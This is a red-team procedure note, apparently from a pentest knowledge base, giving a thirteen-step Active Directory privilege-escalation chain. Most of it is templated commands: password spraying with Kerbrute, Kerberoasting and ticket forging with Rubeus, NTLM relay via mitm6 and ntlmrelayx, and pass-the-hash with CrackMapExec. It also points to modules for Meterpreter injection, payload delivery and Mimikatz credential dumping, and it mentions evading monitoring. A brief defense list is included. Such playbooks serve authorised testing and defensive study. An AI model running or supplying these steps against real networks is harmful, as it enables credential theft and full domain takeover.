---
type: procedure
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Discovery|TA0007 - Discovery]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Domain Trust Discovery|T1482 - Domain Trust Discovery]]'
  - '[[techniques/Kerberoasting|T1208 - Kerberoasting]]'
  - '[[techniques/Pass the Ticket|T1097 - Pass the Ticket]]'
  - >-
    [[techniques/Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos
    Tickets]]
sub_techniques:
  - '[[sub-techniques/AS-REP Roasting|T1558.004 - AS-REP Roasting]]'
  - '[[sub-techniques/Kerberoasting|T1558.003 - Kerberoasting]]'
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Tools]]'
  - active-directory
  - privilege-escalation
  - kerberos
  - smb
commands:
  - '[[commands/ad-recon-run]]'
  - '[[commands/pingcastle-healthcheck-advanced]]'
  - '[[commands/pingcastle-healthcheck]]'
  - '[[commands/pingcastle-graph]]'
  - '[[commands/pingcastle-scanner]]'
  - '[[commands/kerbrute-password-spray]]'
  - '[[commands/rubeus-ask-tgt]]'
  - '[[commands/rubeus-dump-ticket]]'
  - '[[commands/rubeus-klist]]'
  - '[[commands/rubeus-kerberoast]]'
  - '[[commands/cme-smb-list-modules]]'
  - '[[commands/cme-smb-run-module]]'
  - '[[commands/cme-smb-authenticate]]'
  - '[[commands/cme-smb-list-shares]]'
  - '[[commands/cme-smb-run-module-with-domain]]'
  - '[[commands/cme-smb-enable-rdp]]'
  - '[[commands/cme-smb-metinject]]'
  - '[[commands/cme-smb-web-delivery]]'
  - '[[commands/cme-smb-exec-command]]'
  - '[[commands/cme-smb-mimikatz]]'
  - '[[commands/cme-mimikatz-server]]'
  - '[[commands/git-clone-mitm6]]'
  - '[[commands/pip-install-mitm6]]'
  - '[[commands/mitm6-run]]'
  - '[[commands/ntlmrelayx-smb-relay]]'
  - '[[commands/ntlmrelayx-ldap-relay]]'
platforms:
  - Windows
tools:
  - '[[tools/CrackMapExec]]'
  - '[[tools/Mitm6]]'
  - '[[tools/ADRecon]]'
  - '[[tools/PingCastle]]'
  - '[[tools/Kerbrute]]'
  - '[[tools/Rubeus]]'
validated: true
---

# Active-Directory-Assessment-and-Privilege-Escalation

## Summary

This procedure provides a comprehensive approach to assessing an Active Directory (AD) environment for vulnerabilities and performing privilege escalation attacks. It combines reconnaissance tools to map the AD structure, credential testing techniques like password spraying and Kerberoasting, relay attacks using MITM, and exploitation modules via SMB to achieve higher privileges, such as domain admin access.

## Description

Active Directory is a common target in enterprise environments due to its central role in authentication and authorization. This procedure begins with passive and active reconnaissance using tools like ADRecon and PingCastle to identify misconfigurations, weak permissions, and trust relationships. It then moves to active attacks, including password spraying with Kerbrute to test weak credentials, Kerberos ticket manipulation with Rubeus for roasting and ticket passing, and NTLM relay attacks with Mitm6 and ntlmrelayx to coerce authentications. Finally, it leverages CrackMapExec (CME) for SMB-based enumeration, credential validation, and execution of post-exploitation modules like Mimikatz for credential dumping and shell access. This technique is applicable in red team engagements against Windows domain environments, assuming initial low-privilege access or network adjacency. Success can lead to full domain compromise, but requires careful evasion of monitoring like Windows Event Logs and network IDS.

## Requirements

1. Network access to the target AD domain (e.g., via VPN or compromised host).
2. Low-privilege domain credentials or null session for initial enumeration.
3. Installed tools: CrackMapExec, Mitm6, ADRecon, PingCastle, Kerbrute, Rubeus (see tool documents for installation).
4. Python 3+ and PowerShell execution on the attacker's machine.
5. Wordlists for usernames and passwords for spraying attacks.

## Defense

- Implement least privilege principles and regular AD audits using tools like BloodHound for permission reviews.
- Enable multi-factor authentication (MFA) for all accounts and monitor Kerberos pre-authentication failures.
- Deploy network segmentation to limit lateral movement and use endpoint detection for anomalous SMB/NTLM traffic.
- Regularly rotate service account passwords and disable RC4 encryption in favor of AES.
- Monitor for tool signatures like CME user agents or unusual ticket requests via SIEM.

## Objectives

1. Map the AD environment to identify high-value targets and weak points.
2. Validate and extract credentials through spraying, roasting, and relaying.
3. Escalate privileges to domain admin level via ticket forging and remote execution.
4. Establish persistence and exfiltrate sensitive data like hashes or tickets.

## Instructions

### Step 1: Run ADRecon for Domain Enumeration

**Context**: Start by enumerating the AD structure to gather users, groups, computers, and policies. This step provides baseline intelligence for targeting escalation paths without alerting defenses.

**Command** ([[commands/ad-recon-run]]):
```powershell
.\ADRecon.ps1 -DomainController $_DOMAIN_CONTROLLER -Credential $_CREDENTIAL
```

> This command exports AD objects to CSV files for analysis. Review outputs for over-privileged accounts or trust relationships.

**Expected Output**: Multiple CSV files (e.g., Users.csv, Computers.csv) detailing domain objects, permissions, and configurations.

### Step 2: Perform PingCastle Health Check

**Context**: Use PingCastle to scan for common AD vulnerabilities like weak passwords, stale accounts, and risky permissions. This helps prioritize attack vectors.

**Command** ([[commands/pingcastle-healthcheck-advanced]]):
```powershell
pingcastle.exe --healthcheck --server $_DOMAIN_CONTROLLER --user $_USERNAME --password $_PASSWORD --advanced-live --nullsession
```

> If credentials are unavailable, fall back to [[commands/pingcastle-healthcheck]] for basic null-session checks.

**Expected Output**: HTML/PDF report with risk scores, STIG violations, and recommendations (e.g., high-risk admin counts).

### Step 3: Generate AD Graph with PingCastle

**Context**: Visualize trust relationships and delegation paths to identify lateral movement opportunities, such as unconstrained delegation.

**Command** ([[commands/pingcastle-graph]]):
```powershell
pingcastle.exe --graph --server $_DOMAIN
```

**Expected Output**: Graph file (e.g., .gpickle) importable into tools like Gephi, showing AD topology and attack paths.

### Step 4: Scan Specific Vulnerabilities with PingCastle

**Context**: Target specific issues like null sessions or local admins based on initial health check findings.

**Command** ([[commands/pingcastle-scanner]]):
```powershell
pingcastle.exe --scanner $_SCANNER_NAME --server $_DOMAIN
```

> Common scanners: localadmin, nullsession, kerberoastable. Choose based on recon.

**Expected Output**: Detailed scan results for the specified vulnerability, e.g., list of machines with weak local admins.

### Step 5: Password Spray with Kerbrute

**Context**: Test for weak or default passwords across user accounts to gain initial footholds without lockouts.

**Command** ([[commands/kerbrute-password-spray]]):
```bash
./kerbrute passwordspray -d $_DOMAIN $_USERS_FILE $_PASSWORD
```

**Expected Output**: Validated accounts with successful authentications, e.g., "user@domain valid credentials".

### Step 6: List Kerberos Tickets with Rubeus

**Context**: Inspect current tickets to understand session context before manipulation.

**Command** ([[commands/rubeus-klist]]):
```powershell
Rubeus.exe klist [/luid:$_LUID]
```

**Expected Output**: List of cached Kerberos tickets, including service principals and encryption types.

### Step 7: Perform Kerberoasting with Rubeus

**Context**: Request and export TGS tickets for service accounts to crack offline, targeting weak service passwords.

**Command** ([[commands/rubeus-kerberoast]]):
```powershell
Rubeus.exe kerberoast [/spn:"$_SPN"] [/user:$_USER] [/domain:$_DOMAIN] [/dc:$_DOMAIN_CONTROLLER] [/ou:"$_OU"]
```

**Expected Output**: Hashcat-compatible ticket hashes for offline cracking (e.g., $krb5tgs$23$*user$DOMAIN$spn*...).

### Step 8: Request TGT with Rubeus

**Context**: Forge or request Ticket Granting Tickets for pass-the-ticket attacks using known credentials or hashes.

**Command** ([[commands/rubeus-ask-tgt]]):
```powershell
Rubeus.exe asktgt /user:$_USER /password:$_PASSWORD [/enctype:$_ENCTYPE] [/domain:$_DOMAIN] [/dc:$_DOMAIN_CONTROLLER] [/ptt] [/luid]
```

**Expected Output**: Base64-encoded TGT ticket, injectable with /ptt for impersonation.

### Step 9: Dump Tickets with Rubeus

**Context**: Extract specific service tickets for lateral movement or privilege escalation.

**Command** ([[commands/rubeus-dump-ticket]]):
```powershell
Rubeus.exe dump [/service:$_SERVICE] [/luid:$_LUID]
```

**Expected Output**: Exported tickets in .kirbi format for analysis or reuse.

### Step 10: Setup Mitm6 for Relay Attacks

**Context**: Clone and install Mitm6 to spoof IPv6 and coerce NTLM authentications for relaying.

**Command** ([[commands/git-clone-mitm6]]):
```bash
git clone https://github.com/fox-it/mitm6.git && cd mitm6
```

Follow with [[commands/pip-install-mitm6]]:
```bash
pip install .
```

**Expected Output**: Repository cloned and tool installed successfully.

### Step 11: Run Mitm6 and NTLM Relay

**Context**: Spoof network services to capture NTLM hashes and relay to targets for delegation or access.

**Command** ([[commands/mitm6-run]]):
```bash
mitm6 -d $_DOMAIN
```

In parallel, run [[commands/ntlmrelayx-smb-relay]] for SMB or [[commands/ntlmrelayx-ldap-relay]] for LDAP:
```bash
ntlmrelayx.py -wh $_WPAD_HOST -t smb://$_TARGET/ -i
```

**Expected Output**: Captured hashes and relayed sessions, e.g., interactive SMB shell or delegated LDAP access.

### Step 12: Enumerate with CrackMapExec

**Context**: Use CME to validate credentials, list shares, and run modules across the domain.

**Command** ([[commands/cme-smb-list-modules]]):
```bash
cme smb -L
```

Authenticate with [[commands/cme-smb-authenticate]]:
```bash
cme smb $_TARGET -u $_USER -H $_HASH --local-auth
```

List shares: [[commands/cme-smb-list-shares]]
```bash
cme smb $_TARGET -u $_USER -H $_HASH --shares
```

**Expected Output**: Module list, authentication status (e.g., Pwn3d!), and share enumerations.

### Step 13: Run CME Modules for Escalation

**Context**: Execute targeted modules for dumping, execution, and injection based on recon.

**Command** ([[commands/cme-smb-run-module]]):
```bash
cme smb -M $_MODULE -o $_OPTIONS=VALUE
```

Examples: Enable RDP [[commands/cme-smb-enable-rdp]], inject meterpreter [[commands/cme-smb-metinject]], deliver payload [[commands/cme-smb-web-delivery]], exec command [[commands/cme-smb-exec-command]], run Mimikatz [[commands/cme-smb-mimikatz]], or start Mimikatz server [[commands/cme-mimikatz-server]].

**Expected Output**: Module-specific results, e.g., dumped hashes from Mimikatz or successful shell execution.
